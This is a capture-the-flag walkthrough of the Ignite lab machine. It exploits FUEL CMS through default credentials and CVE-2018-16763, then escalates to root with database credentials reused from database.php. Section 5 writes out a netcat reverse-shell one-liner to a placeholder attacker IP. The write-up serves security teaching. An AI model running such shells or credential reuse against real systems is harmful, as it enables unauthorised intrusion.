````markdown
# TryHackMe / HTB — Ignite Walkthrough (Write-Up)

## Overview

This report documents the full exploitation process of the **Ignite** machine.
The objective was to enumerate exposed services, exploit a vulnerable CMS to obtain remote command execution, gain an interactive shell, capture the user flag, and escalate privileges to root using exposed credentials.

---

# 1. Enumeration

Initial reconnaissance was performed using Nmap.

```bash
nmap -sC -sV <TARGET_IP>
````

### Result

The scan revealed:

* 80 — HTTP (Apache Web Server)

Only a web service was exposed, making the website the primary attack surface.

---

# 2. Web Enumeration

Browsing the website revealed a default CMS installation page.

At the bottom of the page the following credentials were exposed:

```
To access the FUEL admin, go to:
/fuel

User name: admin
Password: admin
```

Administrative panel accessed:

```
http://<TARGET_IP>/fuel
```

CMS identified:

```
FUEL CMS Version 1.4
```

---

# 3. Vulnerability Research

Public exploit research identified a known vulnerability:

```
Fuel CMS <= 1.4.1 Remote Code Execution
CVE-2018-16763
```

The vulnerability allows command execution through improper filtering in the pages controller.

Exploit downloaded from Exploit-DB and configured with the target IP.

---

# 4. Remote Code Execution

Exploit executed:

```bash
python3 exploit.py
```

Command execution confirmed:

```bash
whoami
```

Result:

```
www-data
```

Initial access obtained through web-based command execution.

---

# 5. Reverse Shell

Web RCE was limited and inconvenient for further enumeration.

A Netcat listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

Reverse shell executed through the exploit:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

Successful connection received:

```
www-data@ubuntu:/var/www/html$
```

---

# 6. Shell Stabilization

The shell lacked proper TTY functionality.

Stabilized using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Interactive shell obtained.

---

# 7. User Flag

User enumeration performed:

```bash
ls /home
```

User flag discovered:

```
/home/www-data/flag.txt
```

Flag retrieved:

```bash
cat /home/www-data/flag.txt
```

User access confirmed.

---

# 8. Privilege Escalation Enumeration

Application configuration files were inspected for sensitive information.

Directory:

```
/var/www/html/fuel/application/config
```

Database configuration file discovered:

```
database.php
```

File contents revealed database credentials:

```php
'username' => 'root',
'password' => 'mememe',
```

Credentials exposed in plaintext.

---

# 9. Root Exploitation

Credential reuse suspected.

Privilege escalation attempted:

```bash
su -
```

Password used:

```
mememe
```

Authentication successful.

Root shell obtained.

---

# 10. Root Flag

Root directory accessed:

```bash
cd /root
ls
```

Root flag retrieved:

```bash
cat root.txt
```

Privilege escalation completed.

---

# Lessons Learned

* Default credentials should never remain enabled in production environments.
* Publicly exposed CMS installations significantly increase attack surface.
* Configuration files frequently contain sensitive credentials.
* Credential reuse can directly lead to full system compromise.

---

## Tools Used

* Nmap
* Dirsearch
* Exploit-DB
* Python
* Netcat
* Linux Enumeration Commands
